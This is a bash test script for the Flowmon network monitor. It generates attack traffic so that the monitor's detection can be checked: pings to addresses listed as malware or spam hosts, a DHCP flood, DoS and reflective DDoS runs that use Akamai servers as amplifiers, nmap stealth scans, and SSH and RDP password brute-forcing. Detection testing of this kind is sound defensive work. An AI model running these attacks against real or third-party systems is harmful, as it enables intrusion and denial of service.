#!/bin/bash

# This  script tests the flowmon capabilities
# Author: Malachi Cohen

# In linux we need to be root in order to generate traffic online (in most cases)
su

########################### variables
# Victim address
VICTIM='10.8.120.129'
INTERFACE=ens160
########################### utility functions
function print_start {
    echo "############## starting $1 at `date` ##############"
}

function print_end {
    echo  "############## finished $1 at `date` ##############"
}

########################### testing flowmon functions
# This function send IP-ICMP paket to top spammers. flowmon should alert about it
# -c : send 1 packet
# -W : time to wait to response
function communicate_with_spammers {
    ping 1.22.26.83 -W 0 -c 1
    ping 1.160.44.67 -W 0 -c 1
    ping 2.37.232.150 -W 0 -c 1
    ping 2.39.80.25 -W 0 -c 1
    ping 2.50.21.245 -W 0 -c 1
    ping 2.90.17.230 -W 0 -c 1
    ping 5.149.215.56 -W 0 -c 1
    ping 5.149.221.143 -W 0 -c 1
    ping 5.153.129.6 -W 0 -c 1
    ping 8.30.124.6 -W 0 -c 1
}


########################### Attacks

# Blacklist
# Ping a malware-associated IP
# Ping google
# Assert a blacklist event was created for the malware IP
# Assert a blacklist event wasn't created for google
# n.b : the list of the IPs can be found in : https://www.malwaredomainlist.com/mdl.php
print_start "Blacklist"
# Ping the malware IP.
ping 93.190.140.162 -c 1
# ping google
ping google.com -c 1
print_end "Blacklist"


# DHCP anomaly
# detect increased traffic of DHCP
# Send 1000 dhcp request with spoofing client 0.0.0.0
print_start "DHCP increased traffic anomaly"
for i in `seq 1 1000`;
    do
            sudo dhcping -r -t 0 -c 0.0.0.0
    done
print_end "DHCP increased traffic anomaly"


# DOS
# Simple DoS
print_start "simple dos attack"
python dos.py ${VICTIM}
print_end "simple dos attack"


# Amplified DDoS attack
# We use Akamai servers in order to amplified the ddos attack
# -l : Akamai servers list IPs
# -t : target
# -r : request to send
# -n : number of threads
print_start "reflective DDoS"
cd reflective_ddos
python ARDT.py -l akamai_servers_list.txt -t ${VICTIM} -r ExampleHTTPReq.txt  -n 10
print_end "reflective DDoS"

# communicate directly with the internet
# access to internet - just ping google.
# -c 1 : only one ping
print_start "connect to internet"
ping google.com -c 1
print_end "connect to internet"


# 12 DOS
# Dos Attack - flowmon should alert about it
print_start "ddos attack"
python dos.py ${VICTIM}
print_end "ddos attack"


# Communicate with top spammers according to McAfee.
# Dor further details: http://www.mcafee.com/threat-intelligence/ip/spam-senders.aspx
print_start "spammers check"
communicate_with_spammers
print_end "spammers check"


### Port scanning ###
# We do stealth sys scan to check whether flowman detects port scanning
# This should also find icmp type 3 (port unreachable) anomaly

# SYN scan
print_start "SYN port scanning"
nmap -sS ${VICTIM}
print_end "SYN port scanning"

# FIN scan
print_start "FIN port scanning"
nmap -sF ${VICTIM}
print_end "FIN port scanning"

# XMAS scan
print_start "XMAS port scanning"
nmap -sX ${VICTIM}
print_end "XMAS port scanning"

# NULL scan
print_start "NULL port scanning"
nmap -sN ${VICTIM}
print_end "NULL port scanning"

# UDP scan
nmap -sU ${VICTIM}
# SSH attack
print_start "ssh attack"
python ssh_attack.py ${VICTIM} common_passwords.txt
print_end "ssh attack"

# RDP attack
# try to crack RDP server user and password
print_start "RDP attack"
cd RDP
python rdp_attack.py -m x -w rdp_servers.txt -c cracked.txt -n -v common_passwords.txt rdp_servers.txt
cd ..
print_end "RDP attack"

# TOR browsing detection
# Cahnge MTU for *.pcap files replaying
sudo ifconfig ${INTERFACE} mtu 9000 up

## replay a pcap file of recorded tor browser usage traffic
## -t : turbo mode, replay packets as fast as you can (packet timestamp has no effect)
## --intf1 : which interface to send from (change if necessary)
#print_start "tor browser detection"
#sudo tcpreplay -t --intf1=${INTERFACE} tor.pcap
#print_end "tor browser detection"
#
## replay a pcap file of recorded teamviewer (RDP protocol)usage traffic
## -t : turbo mode, replay packets as fast as you can (packet timestamp has no effect)
## --intf1 : which interface to send from (change if necessary)
#print_start "RDP protocol detection"
#sudo tcpreplay -t --intf1=${INTERFACE} rdp.pcap
#print_end "RDP protocol detection"

# Telnet anomaly
# Try to open 100 telnet connections
print_start "Telnet anomaly"
for i in `seq 1 100`;
    do
            sudo nc -p 23 -w 0.1 google.com > /dev/null
    done
print_end "Telnet anomaly"

# Checks that flowmon detects large file download, the file is 1.6GB,
# Also should find connectivity to internet
#print_start "large download"
#wget https://archive.ics.uci.edu/ml/machine-learning-databases/00347/1000_train.csv.gz
#rm 1000_train.csv.gz
#print_end "large download"
